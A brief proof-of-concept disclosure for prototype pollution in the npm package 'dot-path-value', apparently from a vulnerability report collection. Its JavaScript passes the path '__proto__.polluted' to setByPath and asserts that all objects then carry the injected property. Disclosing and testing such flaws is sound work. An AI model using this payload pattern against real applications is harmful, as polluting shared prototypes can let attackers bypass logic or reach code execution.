# dot-path-value

- package name: `dot-path-value`

- PoC exploit:

```javascript
var path = require('dot-path-value');

assert(({}).polluted === undefined);

path.setByPath({}, '__proto__.polluted', 'yes'); // malicious code

assert(({}).polluted === 'yes');
```